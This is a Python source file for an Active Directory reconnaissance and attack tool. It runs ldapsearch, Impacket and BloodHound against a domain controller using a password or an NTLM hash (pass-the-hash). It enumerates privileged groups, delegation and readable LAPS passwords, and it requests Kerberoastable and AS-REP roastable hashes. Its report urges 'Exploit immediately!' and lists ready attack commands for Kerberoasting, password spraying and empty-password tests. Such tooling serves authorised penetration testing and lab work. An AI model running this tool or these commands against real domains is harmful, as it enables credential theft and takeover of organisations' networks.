#!/usr/bin/env python3
import subprocess
import sys
import argparse
import shlex
import re

# ANSI color codes
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
MAGENTA = "\033[1;35m"
CYAN = "\033[1;36m"
RESET = "\033[0m"
BG_RED = "\033[41m"

# Critical patterns to detect - (regex_pattern, severity, description)
CRITICAL_PATTERNS = [
    # PASSWD_NOTREQD - possible empty password
    (r"userAccountControl:\s*\d*32\d*|PASSWD_NOTREQD", "CRITICAL", "PASSWD_NOTREQD - Account may have EMPTY password!"),
    # Kerberoastable users (SPN on user account, not computer)
    (r"servicePrincipalName:\s*\S+", "CRITICAL", "KERBEROASTABLE - SPN found, can extract hash!"),
    # AS-REP Roastable (no preauth required - UAC 4194304)
    (r"userAccountControl:\s*\d*4194304\d*|DONT_REQ_PREAUTH", "CRITICAL", "AS-REP ROASTABLE - No preauth required!"),
    # Unconstrained Delegation (not DC)
    (r"TRUSTED_FOR_DELEGATION|userAccountControl:\s*\d*524288", "HIGH", "UNCONSTRAINED DELEGATION detected!"),
    # Constrained Delegation
    (r"msDS-AllowedToDelegateTo:\s*\S+", "CRITICAL", "CONSTRAINED DELEGATION - Can impersonate users!"),
    # RBCD
    (r"msDS-AllowedToActOnBehalfOfOtherIdentity", "CRITICAL", "RBCD configured - Check permissions!"),
    # Lockout Threshold = 0 (no lockout)
    (r"lockoutThreshold:\s*0\s*$", "CRITICAL", "NO LOCKOUT - Unlimited password spray!"),
    # LAPS password readable
    (r"ms-MCS-AdmPwd:\s*\S+|msLAPS-Password:\s*\S+", "CRITICAL", "LAPS PASSWORD FOUND!"),
    # Machine Account Quota > 0
    (r"ms-DS-MachineAccountQuota:\s*([1-9]\d*)", "HIGH", "MAQ > 0 - Can create computer accounts!"),
    # Password in description
    (r"description:.*(?:pass|pwd|senha|password|cred).*", "CRITICAL", "POSSIBLE PASSWORD IN DESCRIPTION!"),
    # AdminCount=1 on non-default accounts (potential orphaned admins)
    (r"adminCount:\s*1", "INFO", "Account protected by AdminSDHolder"),
    # gMSA accounts
    (r"msDS-GroupMSAMembership|gMSA", "HIGH", "gMSA found - Check who can read password!"),
    # Weak password policy
    (r"minPwdLength:\s*([0-7])\s*$", "HIGH", "WEAK MIN PASSWORD (< 8 characters)!"),
]

def analyze_critical_findings(output, section_title=""):
    """Analyze output for critical security findings."""
    findings = []
    for pattern, severity, description in CRITICAL_PATTERNS:
        matches = re.findall(pattern, output, re.IGNORECASE | re.MULTILINE)
        if matches:
            # Skip krbtgt for Kerberoasting (it's always there but not exploitable)
            if "servicePrincipalName" in pattern and "krbtgt" in output.lower():
                # Check if there are OTHER SPNs besides krbtgt
                spn_lines = re.findall(r"sAMAccountName:\s*(\S+)", output, re.IGNORECASE)
                if len(spn_lines) <= 1:
                    continue
            findings.append({
                "severity": severity,
                "description": description,
                "matches": len(matches) if isinstance(matches[0], str) else len(matches),
                "section": section_title
            })
    return findings

def print_critical_alert(findings):
    """Print critical findings to terminal with red highlighting."""
    if not findings:
        return
    
    print(f"\n{BG_RED}{RED}{'='*60}{RESET}")
    print(f"{BG_RED}{RED}  [!] CRITICAL VULNERABILITIES DETECTED [!]{RESET}")
    print(f"{BG_RED}{RED}{'='*60}{RESET}\n")
    
    for finding in findings:
        severity_color = RED if finding["severity"] == "CRITICAL" else YELLOW if finding["severity"] == "HIGH" else CYAN
        print(f"{severity_color}[{finding['severity']}]{RESET} {finding['description']}")
    
    print(f"\n{RED}{'='*60}{RESET}\n")

def write_critical_markdown(file_handle, findings, section_context=""):
    """Write critical findings to markdown with red styling."""
    if not findings:
        return
    
    file_handle.write("\n> [!CAUTION]\n")
    file_handle.write("> ## <span style=\"color:red\">[!] VULNERABILITIES DETECTED</span>\n>\n")
    
    for finding in findings:
        severity_emoji = "[C]" if finding["severity"] == "CRITICAL" else "[H]" if finding["severity"] == "HIGH" else "[I]"
        file_handle.write(f"> {severity_emoji} <span style=\"color:red; font-weight:bold\">[{finding['severity']}]</span> {finding['description']}\n")
    
    file_handle.write(">\n")
    file_handle.write("> **[>] RECOMMENDED ACTION:** Exploit immediately!\n\n")

def run_cmd(cmd_str, file_handle, section_title=None, check_critical=True):
    """Execute command, print to terminal and write to file in real time.
       Returns the full output for error checking."""
    if section_title:
        print(f"\n{CYAN}[>] {section_title}{RESET}")
        file_handle.write(f"### {section_title}\n\n")
    
    print(f"{BLUE}[*] Executing:{RESET} {cmd_str}")
    file_handle.write(f"**Command:** `{cmd_str}`\n\n```bash\n")
    file_handle.flush()
    
    full_output = ""
    try:
        process = subprocess.Popen(cmd_str, shell=True, executable='/bin/bash', stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        for line in process.stdout:
            print(line, end="")          
            file_handle.write(line)     
            file_handle.flush()
            full_output += line
        process.wait()
    except Exception as e:
        print(f"{RED}ERROR: {e}{RESET}")
        file_handle.write(f"ERROR: {e}\n")
        full_output += f"ERROR: {e}"
    file_handle.write("```\n\n")
    
    # Analyze for critical findings
    findings = []
    if check_critical:
        findings = analyze_critical_findings(full_output, section_title)
        if findings:
            print_critical_alert(findings)
            write_critical_markdown(file_handle, findings, section_title)
            ALL_FINDINGS.extend(findings)
    
    file_handle.write("---\n\n")
    return full_output

# Global list to collect all findings
ALL_FINDINGS = []

def check_ldap_error(output):
    """Check for common LDAP errors and return error message if found."""
    if "Invalid credentials" in output or "data 52e" in output:
        return "Invalid credentials - check username, password and domain format"
    if "Can't contact LDAP server" in output:
        return "Cannot connect to LDAP server - check IP and port 389"
    if "No such object" in output:
        return "Base DN not found - check domain name"
    return None

def main():
    parser = argparse.ArgumentParser(description="LDAP Deep Enumeration - Universal AD Recon Tool")
    parser.add_argument("target", help="DC IP address (e.g., 10.10.10.10)")
    parser.add_argument("-d", "--domain", required=True, help="Domain name (e.g., domain.local)")
    parser.add_argument("-u", "--user", required=True, help="Username for authentication")
    
    # Mutually exclusive group: Password or Hash
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument("-p", "--password", help="Cleartext password")
    auth_group.add_argument("-H", "--hash", help="NTLM hash (e.g., LMHASH:NTHASH or :NTHASH)")
    
    parser.add_argument("-b", "--basedn", help="Custom Base DN (e.g., DC=sub,DC=domain,DC=local)")
    parser.add_argument("--bloodhound", action="store_true", help="Run BloodHound-Python collection")
    parser.add_argument("--quick", action="store_true", help="Quick mode: only essential queries")

    args = parser.parse_args()

    # Validate domain format - warn if it looks like a hostname
    domain_parts = args.domain.split(".")
    if len(domain_parts) > 2:
        # Check if first part looks like a hostname (DC01, SERVER, etc.)
        first_part = domain_parts[0].upper()
        hostname_patterns = ["DC", "AD", "SERVER", "SRV", "WIN", "PDC", "BDC", "RODC"]
        if any(first_part.startswith(p) for p in hostname_patterns) or (len(first_part) <= 6 and any(c.isdigit() for c in first_part)):
            suggested_domain = ".".join(domain_parts[1:])
            print(f"{YELLOW}[!] WARNING: '{args.domain}' looks like a hostname, not a domain.{RESET}")
            print(f"{YELLOW}[!] Did you mean: -d {suggested_domain}{RESET}")
            response = input(f"{YELLOW}[?] Continue anyway? (y/N): {RESET}").strip().lower()
            if response != 'y':
                print(f"{GREEN}[*] Run again with: -d {suggested_domain}{RESET}")
                sys.exit(0)

    # Prepare shell-safe variables
    safe_target = shlex.quote(args.target)
    safe_domain = shlex.quote(args.domain)
    safe_user = shlex.quote(args.user)
    
    # Auto-derive Base DN if not provided
    base_dn = args.basedn if args.basedn else ",".join([f"DC={part}" for part in args.domain.split(".")])
    safe_basedn = shlex.quote(base_dn)

    report_name = f"ldap_deep_{args.domain.replace('.', '_')}.md"
    
    with open(report_name, "w") as f:
        f.write(f"# LDAP Deep Enumeration Report - Domain: {args.domain}\n\n")
        f.write(f"**Target:** {args.target}  \n")
        f.write(f"**Base DN:** {base_dn}  \n\n")
        f.write("---\n\n")
        
        # Authentication logic (Password vs Hash)
        if args.password:
            safe_pass = shlex.quote(args.password)
            print(f"{GREEN}[+] Password authentication detected. Using ldapsearch...{RESET}")
            f.write("## Authentication: Password-based (ldapsearch)\n\n")
            
            # Try different bind DN formats - UPN format often works better
            bind_formats = [
                (f"'{args.user}@{args.domain}'", "UPN format (user@domain)"),
                (f"'{args.domain}\\\\{args.user}'", "NetBIOS format (DOMAIN\\\\user)"),
            ]
            
            ldap_auth = None
            for bind_dn, format_name in bind_formats:
                print(f"{YELLOW}[*] Trying {format_name}...{RESET}")
                test_auth = f"-x -H ldap://{safe_target} -D {bind_dn} -w {safe_pass} -b {safe_basedn}"
                test_cmd = f"ldapsearch {test_auth} -LLL '(objectClass=domain)' dn 2>&1 | head -5"
                
                result = subprocess.run(test_cmd, shell=True, executable='/bin/bash', 
                                        capture_output=True, text=True, timeout=10)
                
                if "Invalid credentials" not in result.stdout and "error" not in result.stdout.lower():
                    print(f"{GREEN}[+] Success with {format_name}{RESET}")
                    ldap_auth = test_auth
                    f.write(f"> ✅ Using {format_name}: `{bind_dn}`\n\n")
                    break
                else:
                    print(f"{RED}[-] Failed with {format_name}{RESET}")
            
            if not ldap_auth:
                print(f"\n{RED}[!] FATAL: All authentication methods failed{RESET}")
                print(f"{YELLOW}[*] Possible causes:{RESET}")
                print(f"    - Wrong credentials")
                print(f"    - LDAP simple bind disabled (try LDAPS or Kerberos)")
                print(f"    - Channel binding required")
                print(f"{YELLOW}[*] Alternative: Use NetExec or Impacket tools instead{RESET}")
                print(f"{YELLOW}[*] Try: nxc ldap {args.target} -u {args.user} -p '<pass>' --users{RESET}")
                f.write(f"\n> ❌ **FATAL ERROR:** All LDAP bind methods failed\n\n")
                f.write(f"> **Alternatives:**\n")
                f.write(f"> - Use `nxc ldap` for NTLM-based LDAP\n")
                f.write(f"> - Use `impacket-GetADUsers` with `-hashes` option\n")
                f.write(f"> - Try LDAPS (port 636) if available\n")
                print(f"\n{GREEN}[+] Partial report saved to: {report_name}{RESET}")
                sys.exit(1)
            
            # =================================================================
            # SECTION 1: Domain Information
            # =================================================================
            f.write("## 1. Domain Information\n\n")
            
            # Domain Controllers
            cmd = f"ldapsearch {ldap_auth} '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' dNSHostName sAMAccountName"
            run_cmd(cmd, f, "Domain Controllers")
            
            # Domain Functional Level (use rootDSE - no base DN needed)
            rootdse_auth = ldap_auth.replace(f"-b {safe_basedn}", "-b ''") + " -s base"
            cmd = f"ldapsearch {rootdse_auth} '(objectClass=*)' domainFunctionality forestFunctionality domainControllerFunctionality"
            run_cmd(cmd, f, "Domain Functional Level")
            
            # =================================================================
            # SECTION 2: Users Enumeration
            # =================================================================
            f.write("## 2. Users Enumeration\n\n")
            
            # All Users with details
            cmd = f"ldapsearch {ldap_auth} '(&(objectClass=user)(objectCategory=person))' sAMAccountName displayName description mail memberOf pwdLastSet lastLogon userAccountControl"
            run_cmd(cmd, f, "All Domain Users")
            
            # Users with descriptions (often contain passwords!)
            cmd = f"ldapsearch {ldap_auth} '(&(objectClass=user)(description=*))' sAMAccountName description"
            run_cmd(cmd, f, "Users with Descriptions (check for passwords!)")
            
            # Disabled accounts
            cmd = f"ldapsearch {ldap_auth} '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' sAMAccountName"
            run_cmd(cmd, f, "Disabled User Accounts")
            
            if not args.quick:
                # Users with password never expires
                cmd = f"ldapsearch {ldap_auth} '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' sAMAccountName"
                run_cmd(cmd, f, "Users with Password Never Expires")
                
                # Users with password not required
                cmd = f"ldapsearch {ldap_auth} '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))' sAMAccountName"
                run_cmd(cmd, f, "Users with PASSWD_NOTREQD Flag")
            
            # =================================================================
            # SECTION 3: Kerberos Attack Vectors
            # =================================================================
            f.write("## 3. Kerberos Attack Vectors\n\n")
            
            # AS-REP Roastable users (no preauth)
            cmd = f"ldapsearch {ldap_auth} '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName"
            run_cmd(cmd, f, "AS-REP Roastable Users (No Preauth Required)")
            
            # Kerberoastable users (users with SPN)
            cmd = f"ldapsearch {ldap_auth} '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))' sAMAccountName servicePrincipalName"
            run_cmd(cmd, f, "Kerberoastable Users (Service Accounts with SPN)")
            
            # =================================================================
            # SECTION 4: Delegation
            # =================================================================
            f.write("## 4. Delegation\n\n")
            
            # Unconstrained delegation
            cmd = f"ldapsearch {ldap_auth} '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' sAMAccountName dNSHostName"
            run_cmd(cmd, f, "Computers with Unconstrained Delegation")
            
            # Constrained delegation
            cmd = f"ldapsearch {ldap_auth} '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo"
            run_cmd(cmd, f, "Accounts with Constrained Delegation")
            
            # Resource-based constrained delegation
            cmd = f"ldapsearch {ldap_auth} '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' sAMAccountName"
            run_cmd(cmd, f, "Accounts with Resource-Based Constrained Delegation")
            
            # =================================================================
            # SECTION 5: Groups
            # =================================================================
            f.write("## 5. Privileged Groups\n\n")
            
            # Domain Admins
            cmd = f"ldapsearch {ldap_auth} '(cn=Domain Admins)' member"
            run_cmd(cmd, f, "Domain Admins Members")
            
            # Enterprise Admins
            cmd = f"ldapsearch {ldap_auth} '(cn=Enterprise Admins)' member"
            run_cmd(cmd, f, "Enterprise Admins Members")
            
            # Administrators
            cmd = f"ldapsearch {ldap_auth} '(cn=Administrators)' member"
            run_cmd(cmd, f, "Administrators Group Members")
            
            if not args.quick:
                # Account Operators
                cmd = f"ldapsearch {ldap_auth} '(cn=Account Operators)' member"
                run_cmd(cmd, f, "Account Operators Members")
                
                # Backup Operators
                cmd = f"ldapsearch {ldap_auth} '(cn=Backup Operators)' member"
                run_cmd(cmd, f, "Backup Operators Members")
                
                # Server Operators
                cmd = f"ldapsearch {ldap_auth} '(cn=Server Operators)' member"
                run_cmd(cmd, f, "Server Operators Members")
                
                # DNS Admins
                cmd = f"ldapsearch {ldap_auth} '(cn=DnsAdmins)' member"
                run_cmd(cmd, f, "DNS Admins Members")
                
                # Remote Desktop Users
                cmd = f"ldapsearch {ldap_auth} '(cn=Remote Desktop Users)' member"
                run_cmd(cmd, f, "Remote Desktop Users")
                
                # Group Policy Creator Owners
                cmd = f"ldapsearch {ldap_auth} '(cn=Group Policy Creator Owners)' member"
                run_cmd(cmd, f, "Group Policy Creator Owners")
            
            # =================================================================
            # SECTION 6: Computers
            # =================================================================
            f.write("## 6. Computers Enumeration\n\n")
            
            # All Computers
            cmd = f"ldapsearch {ldap_auth} '(objectClass=computer)' dNSHostName sAMAccountName operatingSystem operatingSystemVersion"
            run_cmd(cmd, f, "All Domain Computers")
            
            if not args.quick:
                # Servers (non-workstation OS)
                cmd = f"ldapsearch {ldap_auth} '(&(objectClass=computer)(operatingSystem=*Server*))' dNSHostName operatingSystem"
                run_cmd(cmd, f, "Servers Only")
            
            # =================================================================
            # SECTION 7: LAPS (Local Admin Password Solution)
            # =================================================================
            f.write("## 7. LAPS\n\n")
            
            # LAPS passwords (if readable)
            cmd = f"ldapsearch {ldap_auth} '(ms-MCS-AdmPwd=*)' sAMAccountName ms-MCS-AdmPwd ms-MCS-AdmPwdExpirationTime"
            run_cmd(cmd, f, "LAPS Passwords (if accessible)")
            
            # Windows LAPS (new schema)
            cmd = f"ldapsearch {ldap_auth} '(msLAPS-Password=*)' sAMAccountName msLAPS-Password msLAPS-PasswordExpirationTime"
            run_cmd(cmd, f, "Windows LAPS Passwords (new schema)")
            
            # =================================================================
            # SECTION 8: GPO & Policies
            # =================================================================
            if not args.quick:
                f.write("## 8. Group Policy Objects\n\n")
                
                # GPOs
                cmd = f"ldapsearch {ldap_auth} '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath"
                run_cmd(cmd, f, "Group Policy Objects")
                
                # Password Policy (base scope query on domain root)
                ldap_auth_base = ldap_auth + " -s base"
                cmd = f"ldapsearch {ldap_auth_base} '(objectClass=*)' minPwdLength maxPwdAge minPwdAge pwdHistoryLength lockoutThreshold lockoutDuration"
                run_cmd(cmd, f, "Domain Password Policy")
            
            # =================================================================
            # SECTION 9: Trust Relationships
            # =================================================================
            if not args.quick:
                f.write("## 9. Trust Relationships\n\n")
                
                cmd = f"ldapsearch {ldap_auth} '(objectClass=trustedDomain)' cn trustDirection trustType trustAttributes"
                run_cmd(cmd, f, "Domain Trusts")
            
            # =================================================================
            # SECTION 10: Miscellaneous
            # =================================================================
            if not args.quick:
                f.write("## 10. Additional Recon\n\n")
                
                # Machine Account Quota (base scope query)
                ldap_auth_base = ldap_auth + " -s base"
                cmd = f"ldapsearch {ldap_auth_base} '(objectClass=*)' ms-DS-MachineAccountQuota"
                run_cmd(cmd, f, "Machine Account Quota (for machine account attacks)")
                
                # AdminSDHolder protected accounts
                cmd = f"ldapsearch {ldap_auth} '(adminCount=1)' sAMAccountName objectClass"
                run_cmd(cmd, f, "AdminSDHolder Protected Accounts")
                
                # Recently created accounts (last 30 days)
                cmd = f"ldapsearch {ldap_auth} '(&(objectClass=user)(whenCreated>=20260201000000.0Z))' sAMAccountName whenCreated"
                run_cmd(cmd, f, "Recently Created Accounts")
            
            auth_string_bh = f"-p {safe_pass}"
            
        elif args.hash:
            safe_hash = shlex.quote(args.hash)
            print(f"{YELLOW}[!] Hash authentication detected. Using Impacket (Pass-The-Hash)...{RESET}")
            f.write("## Authentication: Hash-based (Impacket PTH)\n\n")
            f.write("> ⚠️ **Note:** `ldapsearch` does not support hashes. Using Impacket tools.\n\n")
            
            impacket_auth = f"-hashes {safe_hash} -dc-ip {safe_target} '{args.domain}/{args.user}'"
            
            # =================================================================
            # Impacket-based enumeration
            # =================================================================
            f.write("## User Enumeration (Impacket)\n\n")
            
            # GetADUsers - also serves as connectivity/auth test
            cmd = f"impacket-GetADUsers -all {impacket_auth}"
            output = run_cmd(cmd, f, "All Domain Users")
            
            # Check for auth errors
            if "error" in output.lower() and ("credentials" in output.lower() or "logon" in output.lower()):
                print(f"\n{RED}[!] FATAL: Authentication failed{RESET}")
                print(f"{YELLOW}[*] Hint: Check domain, username and hash format{RESET}")
                f.write(f"\n> ❌ **FATAL ERROR:** Authentication failed\n")
                print(f"\n{GREEN}[+] Partial report saved to: {report_name}{RESET}")
                sys.exit(1)
            
            # GetUserSPNs (Kerberoasting)
            f.write("## Kerberos Attacks (Impacket)\n\n")
            cmd = f"impacket-GetUserSPNs {impacket_auth} -request"
            run_cmd(cmd, f, "Kerberoastable Users (GetUserSPNs)")
            
            # GetNPUsers (AS-REP Roasting)
            cmd = f"impacket-GetNPUsers {impacket_auth} -request"
            run_cmd(cmd, f, "AS-REP Roastable Users (GetNPUsers)")
            
            if not args.quick:
                # findDelegation
                f.write("## Delegation (Impacket)\n\n")
                cmd = f"impacket-findDelegation {impacket_auth}"
                run_cmd(cmd, f, "Delegation Enumeration")
            
            auth_string_bh = f"--hashes {safe_hash}"

        # =================================================================
        # Optional BloodHound Collection
        # =================================================================
        if args.bloodhound:
            f.write("## BloodHound Collection\n\n")
            print(f"{MAGENTA}[*] Starting BloodHound collection...{RESET}")
            cmd_bh = f"python3 -m bloodhound -u {safe_user} {auth_string_bh} -ns {safe_target} -d {safe_domain} -c All"
            run_cmd(cmd_bh, f, "BloodHound-Python (All collectors)")
        
        # =================================================================
        # Write Final Summary of Critical Findings
        # =================================================================
        write_final_summary(f, ALL_FINDINGS)

    # Print final summary to terminal
    print_final_summary(ALL_FINDINGS)
    print(f"\n{GREEN}[+] Full report saved to: {report_name}{RESET}")


def write_final_summary(file_handle, findings):
    """Write a final summary of all critical findings to the markdown report."""
    if not findings:
        file_handle.write("## FINAL SUMMARY - VULNERABILITIES\n\n")
        file_handle.write("> [+] **No critical vulnerabilities automatically detected.**\n\n")
        file_handle.write("> [!] This does not mean the domain is secure. Review results manually.\n\n")
        return
    
    file_handle.write("## FINAL SUMMARY - VULNERABILITIES DETECTED\n\n")
    file_handle.write("> [!CAUTION]\n")
    file_handle.write('> ## <span style="color:red">[!] CRITICAL VULNERABILITIES FOUND!</span>\n>\n')
    
    # Group by severity
    critical = [f for f in findings if f["severity"] == "CRITICAL"]
    high = [f for f in findings if f["severity"] == "HIGH"]
    info = [f for f in findings if f["severity"] == "INFO"]
    
    if critical:
        file_handle.write('> ### <span style="color:red">[CRITICAL] Immediate Exploitation Possible</span>\n>\n')
        for f in critical:
            file_handle.write(f'> - <span style="color:red; font-weight:bold">**{f["description"]}**</span> (Section: {f["section"]})\n')
        file_handle.write(">\n")
    
    if high:
        file_handle.write('> ### <span style="color:orange">[HIGH] Requires Investigation</span>\n>\n')
        for f in high:
            file_handle.write(f'> - **{f["description"]}** (Section: {f["section"]})\n')
        file_handle.write(">\n")
    
    if info:
        file_handle.write("> ### [INFO] Informational\n>\n")
        for f in info:
            file_handle.write(f'> - {f["description"]} (Section: {f["section"]})\n')
        file_handle.write(">\n")
    
    # Add recommended next steps
    file_handle.write("> ---\n>\n")
    file_handle.write("> ### [>] RECOMMENDED NEXT STEPS:\n>\n")
    
    recommendations = []
    for f in findings:
        if "KERBEROAST" in f["description"]:
            recommendations.append("1. **Kerberoast:** `impacket-GetUserSPNs DOMAIN/user:pass -dc-ip IP -request`")
        if "AS-REP" in f["description"]:
            recommendations.append("2. **AS-REP Roast:** `impacket-GetNPUsers DOMAIN/ -dc-ip IP -request`")
        if "PASSWD_NOTREQD" in f["description"]:
            recommendations.append("3. **Test empty password:** `crackmapexec smb IP -u 'ACCOUNT$' -p ''`")
        if "DELEGATION" in f["description"]:
            recommendations.append("4. **Delegation Attack:** Use S4U2Proxy after obtaining credentials")
        if "LOCKOUT" in f["description"]:
            recommendations.append("5. **Password Spray:** `crackmapexec smb IP -u users.txt -p passwords.txt`")
        if "LAPS" in f["description"]:
            recommendations.append("6. **Use LAPS:** Local admin password found!")
    
    # Deduplicate and write
    for rec in list(dict.fromkeys(recommendations)):
        file_handle.write(f"> {rec}\n")
    
    file_handle.write("\n---\n\n")


def print_final_summary(findings):
    """Print final summary to terminal."""
    if not findings:
        print(f"\n{GREEN}[+] No critical vulnerabilities automatically detected.{RESET}")
        return
    
    print(f"\n{BG_RED}{'='*70}{RESET}")
    print(f"{BG_RED}  FINAL SUMMARY - {len(findings)} VULNERABILITY(IES) DETECTED  {RESET}")
    print(f"{BG_RED}{'='*70}{RESET}\n")
    
    critical_count = len([f for f in findings if f["severity"] == "CRITICAL"])
    high_count = len([f for f in findings if f["severity"] == "HIGH"])
    
    if critical_count:
        print(f"{RED}[CRITICAL]: {critical_count}{RESET}")
    if high_count:
        print(f"{YELLOW}[HIGH]: {high_count}{RESET}")
    
    print(f"\n{RED}Vulnerabilities found:{RESET}")
    unique_descriptions = list(dict.fromkeys([f["description"] for f in findings]))
    for desc in unique_descriptions:
        print(f"  {RED}*{RESET} {desc}")
    
    print(f"\n{GREEN}[>] Check the markdown report for details and exploitation commands.{RESET}")

if __name__ == "__main__":
    main()